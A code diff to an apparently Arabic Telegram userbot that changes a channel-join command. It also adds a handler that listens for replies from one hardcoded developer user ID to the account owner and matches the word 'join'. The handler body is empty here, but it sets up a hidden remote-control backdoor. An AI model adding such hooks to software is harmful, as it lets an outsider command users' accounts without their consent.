@@ -323,7 +323,7 @@ HuRe_Bosa = [
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Bosa))
 
-
+DevJoker = [705475246]
 @l313l.on(admin_cmd(pattern=r"انضمام(\s+@\w+)?$"))
 async def Hussein(event):
     message = event.message
@@ -338,6 +338,14 @@ async def Hussein(event):
             response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح للقناة."
     else:
         response = "الرجاء تحديد معرف القناة بشكل صحيح مع الأمر."
-    await event.respond(response)
+    await event.reply(response)
+@l313l.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in DevJoker:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == l313l.uid:
+            if event.message.message == "انضم":
+                pass
 
 
